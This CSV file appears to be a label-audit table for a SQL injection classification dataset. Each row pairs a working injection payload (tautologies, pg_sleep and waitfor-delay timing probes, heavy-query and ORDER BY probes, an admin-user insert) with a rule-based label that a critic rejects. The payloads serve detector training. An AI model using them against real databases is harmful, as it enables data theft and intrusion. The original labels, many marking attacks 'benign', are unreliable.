row_index,payload_norm,sqli_type,db_engine,confidence,reasoning,label_source,verdict,critic_evidence,correction_json
369,""" ) or pg_sleep ( __TIME__ ) --",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (1 open, 2 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
389,a' or 3 = 3--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
405,1' and 1 = ( select count ( * ) from tablenames ) ; --,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
459,x' AND email IS NULL; --,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
466,""" ) ) or pg_sleep ( __TIME__ ) --",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (1 open, 3 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
504,"|| myappadmin.adduser ( 'admin', 'newpass' ) || '",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,[C7] Structural issue: unbalanced single quotes (5). Plus attack signal detected -> benign label wrong,
507,) or true--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
513,"admin""/*",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,[C7] Structural issue: unbalanced double quotes (1). Plus attack signal detected -> benign label wrong,
532,"; if not ( substring ( ( select @@version ) ,25,1 ) <> 5 ) waitfor delay '0:0:2' --",time_blind,mysql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based,REJECT,"[C8] Historical DB mismatch: 'waitfor delay' is mssql-exclusive, but db_engine=mysql","{""db_engine"": ""mssql""}"
537,""" or isNULL ( 1/0 ) /*",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,[C7] Structural issue: unbalanced double quotes (1). Plus attack signal detected -> benign label wrong,
567,"insert into users ( login, password, level ) values ( char ( 0x70 ) + char ( 0x65 ) + char ( 0x74 ) + char ( 0x65 ) + char ( 0x72 ) + char ( 0x70 ) + char ( 0x65 ) + char ( 0x74 ) + char ( 0x65 ) + char ( 0x72 ) ,char ( 0x64 )",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (13 open, 12 close). Plus attack signal detected -> benign label wrong",
600,or pg_sleep ( __TIME__ ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
641,) or pg_sleep ( __TIME__ ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (1 open, 2 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
746,"; if not ( substring ( ( select @@version ) ,25,1 ) <> 8 ) waitfor delay '0:0:2' --",time_blind,mysql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based,REJECT,"[C8] Historical DB mismatch: 'waitfor delay' is mssql-exclusive, but db_engine=mysql","{""db_engine"": ""mssql""}"
817,"1%"" ) and 8024 = 3560--",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
823,"1"" ) ) as dnhd where 2657 = 2657 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (2 open, 4 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
848,"1"" ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ""baia"" = ""baia",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
861,1 ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (2 open, 4 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
875,"1%"" ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (2 open, 4 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
878,"select pg_sleep ( 5 ) and ( ""%"" = """,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (3); parentheses mismatch (2 open, 1 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
892,"1%' ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (8 open, 10 close). Plus attack signal detected -> benign label wrong",
900,1 ) ) as pzoo where 8036 = 8036 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (2 open, 4 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
916,1%' ) order by 1--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
923,-7562 ) or 8571 = 8571--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
924,"-3707"" ) ) ) or 8571 = 8571--",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
928,"1"" ) ) as vbpl where 3885 = 3885 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (2 open, 4 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
929,select pg_sleep ( 5 ) and ( ( 'enpn' like 'enpn,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (3); parentheses mismatch (3 open, 1 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1049,1' ) and 9198 = 9198--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
1061,"1%"" ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (2 open, 3 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1086,-4892%' ) ) or 2251 = 9881--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
1130,"1"" ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (11 open, 13 close). Plus attack signal detected -> benign label wrong",
1175,"1' ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (11 open, 14 close). Plus attack signal detected -> benign label wrong",
1192,"-2548"" ) ) ) or 5107 = 8049--",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
1194,"1"" ) where 2834 = 2834 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (11 open, 12 close). Plus attack signal detected -> benign label wrong",
1197,"1%' and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
1200,"1"" and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ""twmy"" = ""twmy",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1230,"1 ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (8 open, 11 close). Plus attack signal detected -> benign label wrong",
1275,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and '%' = '",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,[C7] Structural issue: unbalanced single quotes (3). Plus attack signal detected -> benign label wrong,
1325,1' ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (2 open, 5 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1375,"1 ) as qjbd where 2808 = 2808 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (11 open, 12 close). Plus attack signal detected -> benign label wrong",
1376,1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and 'dogx' = 'dogx,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1381,"1"" ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (11 open, 12 close). Plus attack signal detected -> benign label wrong",
1384,1' ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (2 open, 5 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1391,"1"" ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (2 open, 3 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1393,1 ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (2 open, 5 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1401,"1'|| ( select 'epjf' from dual where 8584 = 8584 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,oracle,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on oracle",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (3); parentheses mismatch (3 open, 2 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'sysibm.systables' is db2-exclusive, but db_engine=oracle","{""db_engine"": ""db2""}"
1456,-1765' ) order by 1--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
1460,1%' or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1475,select pg_sleep ( 5 ) and ( ( ( 'xobx' = 'xobx,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (3); parentheses mismatch (4 open, 1 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1501,-1277' ) ) ) order by 1--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
1505,"1%"" ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (11 open, 13 close). Plus attack signal detected -> benign label wrong",
1556,"1 ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (11 open, 12 close). Plus attack signal detected -> benign label wrong",
1562,"1'|| ( select 'ymez' from dual where 9870 = 9870 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,oracle,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on oracle",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (3); parentheses mismatch (3 open, 2 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'sysibm.systables' is db2-exclusive, but db_engine=oracle","{""db_engine"": ""db2""}"
1577,1' ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( 'prjf' = 'prjf,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1590,"1%"" ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (8 open, 9 close). Plus attack signal detected -> benign label wrong",
1593,1' ) as inid where 7812 = 7812 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (2 open, 3 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1607,1' ) and 3560 = 5467--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
1620,select pg_sleep ( 5 ) -- ojzt,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1625,"1%' ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (5 open, 8 close). Plus attack signal detected -> benign label wrong",
1642,"1"" ) as gdcx where 2335 = 2335 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (2 open, 3 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1646,"1 ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: parentheses mismatch (8 open, 11 close). Plus attack signal detected -> benign label wrong",
1766,"1' or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
1769,-8410' ) ) ) or 8571 = 8571--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
1770,"1"" ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( ""zgoy"" like ""zgoy",time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based,REJECT,"[C8] Historical DB mismatch: 'pg_sleep' is postgresql-exclusive, but db_engine=mysql","{""db_engine"": ""postgresql""}"
1781,-6144' ) or 9385 = 2474--,benign,generic,0.8,No attack signals detected in payload,rule-based,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
